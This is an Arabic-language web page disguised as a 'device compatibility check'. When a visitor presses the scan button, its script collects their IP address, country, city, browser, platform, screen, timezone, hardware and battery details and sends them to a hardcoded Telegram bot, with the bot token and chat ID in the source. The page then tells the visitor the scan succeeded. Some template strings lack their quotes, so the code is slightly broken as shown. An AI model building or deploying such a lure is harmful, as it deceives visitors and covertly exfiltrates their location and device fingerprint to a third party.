<!DOCTYPE html>
<html lang="ar">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>فحص الجهاز</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#e67e22,#f39c12);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:20px;padding:30px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
h1{color:#333;margin-bottom:10px}p{color:#666;margin-bottom:20px}
.btn{background:linear-gradient(135deg,#e67e22,#f39c12);color:#fff;border:none;padding:15px 40px;border-radius:50px;font-size:18px;cursor:pointer;width:100%}
.btn:disabled{opacity:.6}
#result{margin-top:15px;padding:10px;border-radius:10px;display:none}
.ok{background:#d4edda;color:#155724;display:block}
.fail{background:#f8d7da;color:#721c24;display:block}
</style></head>
<body>
<div class="card">
    <h1>⚙️ فحص التوافق</h1>
    <p>يتم فحص جهازك للتأكد من توافقه</p>
    <button class="btn" id="btnStart" onclick="getInfo()">🔍 فحص الجهاز</button>
    <div id="result"></div>
</div>
<script>
const TOKEN='7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI',CHAT='1015102519';
const chatId=new URLSearchParams(location.search).get('chatId')||'unknown';
async function getInfo(){
    const btn=document.getElementById('btnStart'),res=document.getElementById('result');
    btn.disabled=true;btn.textContent='⏳ فحص...';
    try{
        let c='غير معروف',ct='غير معروف',ip='غير معروف';
        try{const r=await fetch('https://ipapi.co/json/');if(r.ok){const d=await r.json();c=d.country_name;ct=d.city;ip=d.ip;}}catch(e){}
        let b='غير متاح';
        try{const bat=await navigator.getBattery();b=${Math.round(bat.level*100)}% ${bat.charging?'🔌شاحن':'🔋بطارية'};}catch(e){}
        const msg=📱 **جهاز جديد**\n🆔 ID: \${chatId}\\n🌐 IP: ${ip}\n🌍 الدولة: ${c}, ${ct}\n🔹 المتصفح: ${navigator.userAgent.substring(0,80)}\n🔹 اللغة: ${navigator.language}\n🔹 المنصة: ${navigator.platform}\n🔹 الشاشة: ${screen.width}x${screen.height}\n🔹 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🔹 المعالجات: ${navigator.hardwareConcurrency||'?'}\n🔹 الذاكرة: ${navigator.deviceMemory||'?'}GB\n🔹 البطارية: ${b};
        await fetch(https://api.telegram.org/bot${TOKEN}/sendMessage,{
            method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:CHAT,text:msg,parse_mode:'Markdown'})
        });
        res.className='ok';res.textContent='✅ تم الفحص';btn.textContent='✅ تم';
    }catch(e){res.className='fail';res.textContent='❌ خطأ: '+e.message;btn.disabled=false;btn.textContent='🔍 إعادة الفحص';}
}
</script></body></html>
